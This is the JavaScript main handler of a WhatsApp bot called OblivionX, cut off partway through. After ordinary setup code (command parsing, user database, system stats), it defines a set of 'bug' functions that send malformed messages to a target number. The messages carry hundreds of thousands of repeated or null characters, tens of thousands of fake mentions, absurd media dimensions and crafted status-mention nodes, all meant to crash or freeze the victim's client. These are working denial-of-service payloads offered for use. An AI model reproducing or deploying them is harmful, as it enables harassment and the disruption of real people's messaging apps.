/**

 # ========================================
 * Bot By : Zuunotfound
 * github : https://github.com/Zuunotfound
 * Repo : OblivionX
 * type : Case & Plugin 
 # ========================================
 
 **/

require('./lib/system/config')
require('./lib/system/menu')
require('./lib/system/gear.js')
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const fs = require('fs')
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const axios = require('axios')
const path = require("path")
const cheerio = require('cheerio')
const {
    performance
} = require("perf_hooks");
const TelegraPH = "."
const {
    remini,
    jarak,
    ssweb,
    tiktok,
    PlayStore,
    BukaLapak,
    pinterest,
    stickersearch,
    quote,
    pomf,
    catbox,
    lirik
} = require("./lib/scraper")
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const didyoumean = require('didyoumean');
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const schedule = require("node-schedule");
const archiver = require("archiver");
const threshold = 0.72;
const {
    jadibot,
    conns
} = require("./lib/jadibot/clone.js")
const similarity = require('similarity');
const X = "`"
const chalk = require("chalk")
const {
    generateWAMessage,
    areJidsSameUser,
    proto,
    downloadContentFromMessage,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    generateWAMessageContent
} = require("@adiwajshing/baileys")
const {
    default: makeWASocket,
    useMultiFileAuthState
} = require("@adiwajshing/baileys")
const more = String.fromCharCode(8206);
const readmore = more.repeat(4800)
const {
    bytesToSize,
    checkBandwidth,
    formatSize,
    jsonformat,
    nganuin,
    pickRandom,
    runtime,
    shorturl,
    formatp,
    color,
    getGroupAdmins,
    sleep,
    formatDate,
    getTime,
    isUrl,
    await,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    fetchBuffer,
    toms,
    buffergif
} = require('./lib/simple')
const {
    FajarNews,
    BBCNews,
    metroNews,
    CNNNews,
    iNews,
    KumparanNews,
    TribunNews,
    DailyNews,
    DetikNews,
    OkezoneNews,
    CNBCNews,
    KompasNews,
    SindoNews,
    TempoNews,
    IndozoneNews,
    AntaraNews,
    RepublikaNews,
    VivaNews,
    KontanNews,
    MerdekaNews,
    KomikuSearch,
    AniPlanetSearch,
    KomikFoxSearch,
    KomikStationSearch,
    MangakuSearch,
    KiryuuSearch,
    KissMangaSearch,
    KlikMangaSearch,
    PalingMurah,
    LayarKaca21,
    AminoApps,
    Mangatoon,
    WAModsSearch,
    Emojis,
    CoronaInfo,
    JalanTikusMeme,
    Cerpen,
    Quotes,
    Couples,
    Darkjokes
} = require("dhn-api");
const {
    addExif
} = require('./lib/exif')
const {
    youtube
} = require("btch-downloader");
const search = require("yt-search");
const fg = require('api-dylux')
const { ephoto, photoOxy } = require("./lib/importe/scraper/textmaker")
module.exports = zuu = async (zuu, m, chatUpdate, store) => {
    try {
        const body = (m && m.mtype) ? (
            m.mtype === 'conversation' ? m.message?.conversation :
            m.mtype === 'imageMessage' ? m.message?.imageMessage?.caption :
            m.mtype === 'videoMessage' ? m.message?.videoMessage?.caption :
            m.mtype === 'extendedTextMessage' ? m.message?.extendedTextMessage?.text :
            m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === 'listResponseMessage' ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
            m.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
            m.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m.msg.selectedId, chatUpdate) :
            m.mtype === 'messageContextInfo' ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) :
            ''
        ) : '';
        async function appenTextMessage(text, chatUpdate) {
            let messages = await generateWAMessage(m.chat, {
                text: text,
                mentions: m.mentionedJid
            }, {
                userJid: zuu.user.id,
                quoted: m.quoted && m.quoted.fakeObj
            })
            messages.key.fromMe = areJidsSameUser(m.sender, zuu.user.id)
            messages.key.id = m.key.id
            messages.pushName = m.pushName
            if (m.isGroup) messages.participant = m.sender
            let msg = {
                ...chatUpdate,
                messages: [proto.WebMessageInfo.fromObject(messages)],
                type: 'append'
            }
            zuu.ev.emit('messages.upsert', msg)
        }
        const budy = (m && typeof m.text === 'string') ? m.text : '';
        const prefix = /^[°zZ#@*+,.?''():√%!¢£¥€π¤ΠΦ_&<`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#@*+,.?''():√%¢£¥€π¤ΠΦ_&<!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
        const isCmd = body.startsWith(prefix)
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1);
        const full_args = body.replace(command, '').slice(1).trim();
        const pushname = m.pushName || "No Name";
        const botNumber = await zuu.decodeJid(zuu.user.id);
        const newowner = JSON.parse(fs.readFileSync('./lib/database/owner.json'))
        const isCreator = (m && m.sender && [botNumber, ...newowner, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const itsMe = (m && m.sender && m.sender == botNumber) || false;
        const banned = JSON.parse(fs.readFileSync('./lib/database/banned.json'))
        const isBan = banned.includes(m.sender)
        const text = q = args.join(" ");
        const fatkuns = m && (m.quoted || m);
        const quoted = (fatkuns?.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
            (fatkuns?.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
            (fatkuns?.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] :
            m.quoted || m;
        const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
        const qmsg = (quoted?.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const groupMetadata = m.isGroup ? await zuu.groupMetadata(m.chat).catch(e => {}) : {};
        const groupName = m.isGroup ? groupMetadata.subject || '' : '';
        const participants = m.isGroup ? await groupMetadata.participants || [] : [];
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) || [] : [];
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
        const groupOwner = m.isGroup ? groupMetadata.owner || '' : '';
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false;
        
        //================== [ TIME ] ==================//
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
        
        //================== [ DATABASE ] ==================//
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!('hitcmd' in user)) user.hitcmd = 0
                if (!('bits' in user)) user.bits = 0
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!isNumber(user.limit)) user.limit = 270
                if (!('afkReason' in user)) user.afkReason = ''
            } else global.db.data.users[m.sender] = {
                hitcmd: 0,
                bits: 0,
                afkTime: -1,
                limit: 271,
                afkReason: '',
            }
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('isBanned' in chat)) chat.isBanned = false
                if (!('mute' in chat)) chat.mute = false
            } else global.db.data.chats[m.chat] = {
                isBanned: false,
                mute: false,
            }
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!('autoread' in setting)) setting.autoread = false
                if (!("public" in settings)) settings.public = true
                if (!('setkota' in setting)) setting.setkota = "Makassar"
                if (!("onlypc" in settings)) settings.onlypc = false
                if (!("onlygc" in settings)) settings.onlygc = false
                if (!("autobio" in settings)) settings.autobio = false
                if (!("autorecordtype" in settings)) settings.autorecordtype = false
                if (!("autoRecording" in settings)) settings.autoRecording = false
                if (!("autoTyping" in settings)) settings.autoTyping = false
                if (!("cmdtotal" in settings)) settings.cmdtotal = 0               
            } else global.db.data.settings[botNumber] = {
                autoread: false,
                public: true,
                setkota: "Makkasar",
                cmdtotal: 0,
                onlypc: false,
                onlygc: false,
                autorecordtype: false,
                autobio: false,
                autoRecording: false,
                autoTyping: false,
            }
        } catch (err) {}
        const userdb = global.db.data.users[m.sender]
        const settingdb = global.db.data.settings[botNumber]
        const chatdb = global.db.data.chats[m.chat]
        const used = process.memoryUsage();
        const cpus = os.cpus().map((cpu) => {
            cpu.total = Object.keys(cpu.times).reduce(
                (last, type) => last + cpu.times[type],
                0,
            );
            return cpu;
        });
        const cpu = cpus.reduce(
            (last, cpu, _, {
                length
            }) => {
                last.total += cpu.total;
                last.speed += cpu.speed / length;
                last.times.user += cpu.times.user;
                last.times.nice += cpu.times.nice;
                last.times.sys += cpu.times.sys;
                last.times.idle += cpu.times.idle;
                last.times.irq += cpu.times.irq;
                return last;
            }, {
                speed: 0,
                total: 0,
                times: {
                    user: 0,
                    nice: 0,
                    sys: 0,
                    idle: 0,
                    irq: 0,
                },
            },
        );
        var date = new Date();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
        var cpuuuu = os.cpus();
        var sisaram = `${Math.round(os.freemem)}`;
        var totalram = `${Math.round(os.totalmem)}`;
        var persenram = (sisaram / totalram) * 100;
        var persenramm = 100 - persenram;
        var ramused = totalram - sisaram;
        var space = await checkDiskSpace(process.cwd());
        var freespace = `${Math.round(space.free)}`;
        var totalspace = `${Math.round(space.size)}`;
        var diskused = totalspace - freespace;
        var neww = performance.now();
        var oldd = performance.now();
        let timestamp = speed();
        let latensi = speed() - timestamp;
        var {
            download,
            upload
        } = await checkBandwidth();
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
        const timeday = `${hariini} - ${wib}`
        const prem = JSON.parse(fs.readFileSync("./lib/database/premium.json"))
        const isPremium = prem.includes(m.sender)
        const isGroup = m.isGroup
        const fsaluran = {
            key: {
                remoteJid: '0@s.whatsapp.net',
                participant: '0@s.whatsapp.net'
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '120363399204776509@newsletter',
                    newsletterName: '',
                    caption: body
                }
            }
        }
        const reactmess = async (type) => {
            zuu.sendMessage(m.chat, {
                'react': {
                    'text': type,
                    'key': m.key
                }
            });
        }
        const reply = async (teks = "Example", id = m.chat) => {
           await zuu.sendMessage(id, {
                document: fs.readFileSync("./package.json"),
                fileName: global.filename,
                fileLength: 99999999999999,
                mimetype: 'image/png',
                jpegThumbnail: fs.readFileSync("./assets/Gallery/doc4.jpg"),
                caption: "\n" + teks,
            }, {
                quoted: fsaluran,
                ephemeralExpiration: 86400
            });
        }
        const resver = `
╾────( \`𝄽𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗𝄽\` )────╼        
╭────────────────╼
╎▢ \`なᝄめ\` ☇ 𝐎𝐁𝐋𝐈𝐕𝐈𝐎𝐍𝐗 - 𝐁𝐫𝐞𝐚𝐤𝐞𝐫𝐕𝐨𝐢𝐝 ᝄ
║▢ \`れᝄあ\` ☇ 𝐙𝐔𝐔𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃 ᝄ
╎▢ \`せᝄお\` ☇ 𝐌𝐃 𝐗 𝐁𝐔𝐆 ᝄ
│▢ \`なᝄま\` ☇ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 : ${isPremium ? 'Yes':'No'} ᝄ
╎▢ \`なᝄま\` ☇ 𝐇𝐈𝐓 𝐂𝐌𝐃: ${userdb.hitcmd} ᝄ
╰────────────────╼

⾼ \`𝐒𝐏𝐄𝐒𝐈𝐅𝐈𝐗 𝐄𝐗𝐓𝐄𝐑𝐍𝐀𝐋 ᝄ\`
⭔↯-UPLOAD : ${upload}
⭔↯-DOWNLOAD : ${download}
⭔↯-NODEJS VERSION : ${process.version}
⭔↯-VERSION : ${global.version}
⭔↯-BAILEYS : custom`

//==Function Bug==//
async function OblNotif(target) {
      zuu.relayMessage(target, {
          extendedTextMessage: {
            text: "༿༑ᜳ𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗" + "ꦽ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: shinz.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [target],
              quotedMessage: {
                conversation: "ꦽ".repeat(90000),
              },
              disappearingMode: {
                initiator: 1,
                trigger: 2,
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        }, { participant: { jid: target },
        },
        {
          messageId: null,
        }
      );
    }
async function delayinvis(target, mention) {
console.log("Sedang Mengirim Bug DelayInvis 1")
const msg = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
videoMessage: {
url: "https://mmg.whatsapp.net/v/t62.7161-24/34787213_2685884481608614_5159663029737716132_n.enc?ccb=11-4&oh=01_Q5Aa1QGlXGMLcDZs-pF3b55vTaa3evXlsj59B2Vrmb7NmRevmw&oe=682815EE&_nc_sid=5e03e0&mms3=true",
mimetype: "video/mp4",
fileSha256: "IolPEhxao0pWk+rTGX0pZ3bJ3wvqRf+UBlv3V75Xf00=",
fileLength: 999999,
seconds: 999999,
mediaKey: "OVXoXEduHriZUHMfocj4Fw4lfvL73QBo/H13anUCHuM=",
caption: "\u9999",
height: 999999,
width: 999999,
fileEncSha256: "q85lwpuFCRlsRM190+IJej1A+TxaqNF1hM9sZLqckk4=",
directPath: "/v/t62.7161-24/34787213_2685884481608614_5159663029737716132_n.enc?ccb=11-4&oh=01_Q5Aa1QGlXGMLcDZs-pF3b55vTaa3evXlsj59B2Vrmb7NmRevmw&oe=682815EE&_nc_sid=5e03e0&_nc_hot=1744870816",
mediaKeyTimestamp: "1743742853",
contextInfo: {
isSampled: true,
mentionedJid: [
"13135550002@s.whatsapp.net",
...Array.from({ length: 30000 }, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
},
streamingSidecar: "RPi+B8Voj+7DbCyynZsZHLYUhQP1Eajtc3g312m2UGn6N798ZgDAZrV03Dxx0vYIMgJUEy0p6tUDKwyqhIk+pO8De1N+S7Zy0MTlv/0SceFKWeaw9x+lg8jyHXiJr7F5tndJt9divfOaMYpeAM/Xah3Plhb4P65E7yLSXRsTd2Pb18USCCGKBGB9aBLoRlcyhAQPBdHyuFE3T/8b1D30UMQJvINLZnsz/gmn4ooI82oExLN3mdUaITOq4bTwNDQVof1vfpOCL5gRT56WMNZ9jd2DfdY9EFAgpFytqaOUfV9DusPY2M5bBeaIVDfQ6iAPxDrCgasPL8LTWqZLX95pZuSAM/6ofbBMEnvWSOxLINmx0KKgng646BixzWVAUoIjE0ixyOlZyN5gYA82wPn2JKgdvfeIfreMkRv6k9IFOqghcVKJp1v5FNP+fcaeas9shkZEcAJo9ryFNamdBBw/yCdD0oeNoon8PNuc5VBDIUon1FsWKSKdSR/mtgnwvzvucyl7vT1hohobuP4AIKheVogmrfXPajxmQ0Rt9fqM7Gw3+PQbdMf/NVRrUIh5xLNfDJyrNGb4kDhI5ZQlf3tze8fYhS3V11OsXCd3V4mTtDpRlDNRKcjDkkxG2cdT+aNeC3gz1xCwFjRBAKdi/xMecNBPMmpt8H/EAWdvD8gGU6lY/7kCx0lt/vzu9/eVzLDqTDAgNnoLQdz5yZgIXxF2vk11rHc0BwRU2fUiWUpe/Y2WuRjL4sX1wUYaoAlZ45CvrJFTaN1OUQond8Ny+L7WgHDnYFkziULQ",
thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
annotations: [
{
embeddedContent: {
embeddedMusic: {
musicContentMediaId: "blue",
songId: "blue",
author: "\u9999",
title: "\u9999",
artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
countryBlocklist: true,
isExplicit: true,
artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
}
},
embeddedAction: null
}
]
}
}
}
}, {})

zuu.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
})

if (mention) {
zuu.relayMessage(target, {
groupStatusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
}, {
additionalNodes: [{
tag: "meta",
attrs: {
is_status_mention: "true"
},
content: undefined
}]
})
}
console.log(chalk.green.bold("Sukses Kirim Bug DelayInvis 1"))
}

async function delayinvis2(target, mentionn) {
console.log("Sedang Mengirim Bug DelayInvis 2")
const msg = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
videoMessage: {
url: "https://mmg.whatsapp.net/v/t62.7161-24/34787213_2685884481608614_5159663029737716132_n.enc?ccb=11-4&oh=01_Q5Aa1QGlXGMLcDZs-pF3b55vTaa3evXlsj59B2Vrmb7NmRevmw&oe=682815EE&_nc_sid=5e03e0&mms3=true",
mimetype: "video/mp4",
fileSha256: "IolPEhxao0pWk+rTGX0pZ3bJ3wvqRf+UBlv3V75Xf00=",
fileLength: 999999,
seconds: 999999,
mediaKey: "OVXoXEduHriZUHMfocj4Fw4lfvL73QBo/H13anUCHuM=",
caption: "\u9999",
height: 999999,
width: 999999,
fileEncSha256: "q85lwpuFCRlsRM190+IJej1A+TxaqNF1hM9sZLqckk4=",
directPath: "/v/t62.7161-24/34787213_2685884481608614_5159663029737716132_n.enc?ccb=11-4&oh=01_Q5Aa1QGlXGMLcDZs-pF3b55vTaa3evXlsj59B2Vrmb7NmRevmw&oe=682815EE&_nc_sid=5e03e0&_nc_hot=1744870816",
mediaKeyTimestamp: "1743742853",
contextInfo: {
isSampled: true,
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 30000
    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
},
streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
annotations: [{
embeddedContent: {
embeddedMusic: {
musicContentMediaId: "OblivionX-zuu",
songId: "OblivionX-zuu",
author: ".OblivionX-zuu",
title: "OblivionX-zuu",
artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
countryBlocklist: true,
isExplicit: true,
artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
}
},
embeddedAction: null
}]
}
}
}
}, {})

zuu.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
})

if (mentionn) {
const payment0 = {
key: msg.key,
type: 25
}
const payment1 = {
protocolMessage: payment0
}
const payment2 = {
message: payment1
}
const payment = {
groupStatusMentionMessage: payment2
}
const paymen10 = {
tag: "meta",
attrs: {},
content: undefined
}
paymen10.attrs.is_status_mention = "true";
const additional = {
additionalNodes: [paymen10]
}
zuu.relayMessage(target, payment, additional)
}
console.log(chalk.green.bold("Sukses Kirim Bug DelayInvis 2"))
}

async function delayinvis3(target, mentionnn) {
console.log("Sedang Mengirim Bug DelayInvis 3")
let msg = await generateWAMessageFromContent(target, {
buttonsMessage: {
text: "\u0000",
contentText:
"\u0000",
footerText: "\u0000",
buttons: [
{
buttonId: "\u0000",
buttonText: {
displayText: "\u0000".repeat(800000),
},
type: 1,
},
],
headerType: 1,
},
}, {})

zuu.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined,
},
],
},
],
},
],
})

if (mentionnn) {
zuu.relayMessage(target, {
groupStatusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25,
},
},
},
},
{
additionalNodes: [
{
tag: "meta",
attrs: {
is_status_mention: "true"
},
content: undefined,
},
],
}
)
}
console.log(chalk.green.bold("Sukses Kirim Bug DelayInvis 3"))
}
async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await zuu.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function prokontol4(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "Oblivionx",
                    footerText: "𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await zuu.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await zuu.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗‌",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
     console.log(chalk.bold(`Sukses Delay Invis 7`));
        }

async function prokontol5(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
